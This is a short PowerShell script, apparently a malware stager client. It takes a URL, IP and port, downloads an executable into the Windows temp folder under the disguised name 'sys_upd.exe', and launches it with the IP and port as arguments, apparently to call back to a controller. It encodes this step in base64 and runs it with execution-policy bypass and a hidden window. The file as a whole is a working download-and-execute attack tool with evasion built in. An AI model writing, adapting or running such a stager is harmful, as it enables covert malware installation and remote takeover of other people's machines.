param(
    [string]$URL,
    [string]$IP,
    [string]$PORT
)

if (-not $URL -or -not $IP -or -not $PORT) {
    Write-Host "Usage: .\windows_client.ps1 <URL> <IP> <PORT>" -ForegroundColor Yellow
    exit
}

# The template logic for the stager
$RawScript = @"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
`$f="`$env:TEMP\sys_upd.exe";
(New-Object Net.WebClient).DownloadFile('$URL', `$f);
Start-Process `$f -ArgumentList '$IP $PORT'
"@

# Encode the script on-the-fly to UTF-16LE and Base64
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($RawScript)
$Encoded = [Convert]::ToBase64String($Bytes)

# Execute the final clean command
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $Encoded
